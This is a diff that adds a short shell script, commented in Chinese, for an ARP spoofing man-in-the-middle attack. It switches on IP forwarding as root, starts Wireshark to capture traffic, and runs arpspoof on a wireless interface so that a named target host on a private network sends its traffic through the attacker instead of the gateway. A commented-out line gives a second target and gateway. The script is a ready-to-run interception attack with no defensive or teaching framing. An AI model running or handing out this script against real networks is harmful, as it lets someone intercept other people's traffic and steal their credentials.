@@ -1,0 +1,11 @@
+#先su到root权限
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+wireshark &
+
+#         网卡           攻击目标主机的IP  网关
+arpspoof -i wlp4s0 -t 192.168.1.116 192.168.1.1
+
+#arpspoof -i wlp4s0 -t 10.112.69.30 10.112.69.1
+
+echo 0 > /proc/sys/net/ipv4/ip_forward
